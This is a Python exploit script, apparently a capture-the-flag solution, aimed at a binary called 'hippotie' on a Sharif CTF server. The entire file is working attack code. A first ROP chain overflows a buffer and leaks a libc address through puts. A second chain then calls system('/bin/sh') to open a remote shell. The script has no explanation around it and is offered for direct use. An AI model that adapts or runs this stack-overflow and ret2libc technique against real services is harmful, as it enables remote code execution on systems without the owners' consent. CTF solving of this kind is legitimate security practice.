#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.75.139','port':8080}, \
                        remote  = {'host':'ctf.sharif.edu','port':54519})
env.set_item('libc',    local   = 'D:\CTF\FILES\libc-2.19.so_amd64_local', \
                        remote  = 'libc.so.6')
env.select()

libc = ELF(env.libc)
binf = ELF('hippotie', rop=True)

addr_plt_puts       = binf.plt('puts')
addr_plt_alarm      = binf.plt('alarm')
addr_plt_exit       = binf.plt('exit')
addr_got_main       = binf.got('__libc_start_main')
addr_pop_rdi        = binf.ropgadget('pop rdi', 'ret')
addr_main           = 0x401365

#==========
def attack(cmn):
    cmn.read_until('> ')
    cmn.sendln('1')
    cmn.read_until('Name: ')
    cmn.sendln('a')
    cmn.read_until('Password: ')
    cmn.sendln('b')

    cmn.read_until('> ')
    cmn.sendln('2')
    cmn.read_until('Name: ')
    cmn.sendln('a')
    cmn.read_until('Password: ')
    cmn.sendln('b')

    exploit_st1  = '\x00'*0x210
    exploit_st1 += pack_64(0xdeadbeef)
    exploit_st1 += pack_64(addr_pop_rdi)
    exploit_st1 += pack_64(0)
    exploit_st1 += pack_64(addr_plt_alarm)
    exploit_st1 += pack_64(addr_pop_rdi)
    exploit_st1 += pack_64(addr_got_main)
    exploit_st1 += pack_64(addr_plt_puts)
    exploit_st1 += pack_64(addr_main)
    cmn.read_until('> ')
    cmn.sendln('3')
    cmn.read_until('pack? ')
    cmn.sendln(exploit_st1)

    cmn.read_until('> ')
    cmn.sendln('4')
    cmn.read_until()
    addr_libc_main  = unpack_64(mold_64(cmn.read_until(contain=False)))
    libc.set_location('__libc_start_main', addr_libc_main)
    addr_libc_system    = libc.function('system')
    addr_libc_str_sh    = libc.search('/bin/sh')

    exploit_st2  = '\x00'*0x210
    exploit_st2 += pack_64(0xdeadbeef)
    exploit_st2 += pack_64(addr_pop_rdi)
    exploit_st2 += pack_64(addr_libc_str_sh)
    exploit_st2 += pack_64(addr_libc_system)
    exploit_st2 += pack_64(addr_plt_exit)
    cmn.read_until('> ')
    cmn.sendln('3')
    cmn.read_until('pack? ')
    cmn.sendln(exploit_st2)

    cmn.read_until('> ')
    cmn.sendln('4')
    
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    #Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
